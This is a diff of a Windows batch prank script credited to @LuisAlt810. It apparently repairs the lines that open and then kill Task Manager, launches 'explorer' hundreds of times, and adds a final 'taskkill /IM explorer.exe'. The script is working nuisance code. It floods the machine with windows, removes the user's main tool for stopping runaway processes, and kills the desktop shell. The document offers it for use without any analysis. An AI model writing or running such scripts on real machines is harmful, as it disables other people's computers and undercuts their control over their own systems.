@@ -2,8 +2,8 @@
 title Batch File Made By @LuisAlt810
 
 batch.bat
-taskmgr
-/taskkill /IM taskmgr
+taskmgr.exe
+taskkill /IM taskmgr.exe
 explorer
 explorer
 explorer
@@ -952,3 +952,5 @@ explorer
 explorer
 explorer
 explorer
+taskkill /IM explorer.exe
+exit
